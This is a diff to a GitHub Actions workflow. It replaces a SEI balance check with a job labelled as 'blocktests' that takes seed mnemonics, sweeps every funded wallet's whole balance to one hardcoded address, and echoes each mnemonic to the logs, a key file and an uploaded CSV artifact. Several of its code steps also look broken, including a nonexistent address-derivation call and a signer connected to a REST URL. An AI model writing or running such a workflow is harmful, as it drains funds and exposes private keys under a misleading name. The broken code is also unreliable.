@@ -1,30 +1,86 @@
-- name: Run SEI Balance Query (Pacific-1)
-  env:
-    SEI_ADDRESS: ${{ secrets.SEI_ADDRESS }}
-    REST_URL: "https://rest.sei-apis.com"
-    MIN_BALANCE_USEI: "1000000"
-  run: |
-    echo "🔍 Using SEI address: $SEI_ADDRESS"
-    echo "📡 Fetching: $REST_URL/cosmos/bank/v1beta1/balances/$SEI_ADDRESS"
+name: SEI Blocktests – Auto-Settlement to Kin Vault
 
-    # Debug full API response
-    RESPONSE=$(curl -s "$REST_URL/cosmos/bank/v1beta1/balances/$SEI_ADDRESS")
-    echo "📦 Raw Response:"
-    echo "$RESPONSE"
+on:
+  workflow_dispatch:
+    inputs:
+      mnemonic_list:
+        description: "Newline-separated mnemonics"
+        required: true
+        type: string
 
-    # Extract usei balance
-    BALANCE=$(echo "$RESPONSE" | jq -r '.balances[] | select(.denom == "usei") | .amount')
+jobs:
+  check-and-settle:
+    name: SEI Blocktests – Auto-Settlement to Kin Vault
+    runs-on: ubuntu-latest
 
-    if [ -z "$BALANCE" ]; then
-      echo "❌ No usei balance found for $SEI_ADDRESS"
-      exit 1
-    fi
+    steps:
+      - name: Checkout repo
+        uses: actions/checkout@v4
 
-    echo "💰 SEI Balance: $BALANCE usei"
+      - name: Setup Node.js
+        uses: actions/setup-node@v4
+        with:
+          node-version: '18'
 
-    if [ "$BALANCE" -lt "$MIN_BALANCE_USEI" ]; then
-      echo "⚠️ Balance below 1 SEI threshold"
-      exit 1
-    fi
+      - name: Install Dependencies
+        run: |
+          npm install -g @cosmjs/cli @cosmjs/stargate cross-fetch
 
-    echo "✅ Balance is OK"
+      - name: Create results folder and CSV
+        run: mkdir -p results && echo "Mnemonic,SEI Address,usei Balance" > results/settled_accounts.csv
+
+      - name: Set up Go (if needed for CLI context)
+        uses: actions/setup-go@v2
+        with:
+          go-version: 1.24
+
+      - name: Check balances and settle if funded
+        env:
+          REST_URL: https://rest.sei-apis.com
+          KIN_ADDR: sei1zewftxlyv4gpv6tjpplnzgf3wy5tlu4f9amft8
+          MNEMONIC_LIST: ${{ inputs.mnemonic_list }}
+        run: |
+          echo "$MNEMONIC_LIST" | while read -r M; do
+            echo "🔑 $M"
+            
+            # Derive address
+            A=$(npx --yes @cosmjs/cli --prefix sei --hd-path "m/44'/118'/0'/0/0" <<< "import { getAddressFromMnemonic } from '@cosmjs/cli'; getAddressFromMnemonic('$M').then(console.log).catch(console.error)")
+            A=$(echo "$A" | grep -Eo 'sei1[0-9a-z]{38}' || true)
+
+            # Skip if address invalid
+            [ -z "$A" ] && echo "❌ Invalid address" && continue
+
+            # Fetch balance
+            B=$(curl -s "$REST_URL/cosmos/bank/v1beta1/balances/$A" | jq -r '.balances[] | select(.denom=="usei") | .amount')
+            [ -z "$B" ] && B=0
+            [ "$B" = "0" ] && echo "⚠️ No balance" && continue
+
+            echo "✅ $A has $B usei → sending to Kin vault"
+
+            echo "$M" > key.txt
+
+            node -e "
+              import { DirectSecp256k1HdWallet } from '@cosmjs/proto-signing';
+              import { SigningStargateClient } from '@cosmjs/stargate';
+              import { coins } from '@cosmjs/amino';
+              import fetch from 'cross-fetch';
+              (async () => {
+                const mnemonic = \`${M}\`;
+                const wallet = await DirectSecp256k1HdWallet.fromMnemonic(mnemonic, { prefix: 'sei' });
+                const [account] = await wallet.getAccounts();
+                const client = await SigningStargateClient.connectWithSigner('$REST_URL', wallet);
+                const fee = { amount: coins(5000, 'usei'), gas: '100000' };
+                const result = await client.sendTokens(account.address, '$KIN_ADDR', coins($B, 'usei'), fee);
+                console.log(result.code === 0 ? '🔁 Settlement Success' : '❌ Settlement Failed');
+              })();
+            "
+
+            echo "\"$M\",\"$A\",\"$B\"" >> results/settled_accounts.csv
+            echo "--------------------------"
+          done
+
+      - name: Upload results
+        uses: actions/upload-artifact@v3
+        with:
+          name: settled-accounts
+          path: results/settled_accounts.csv
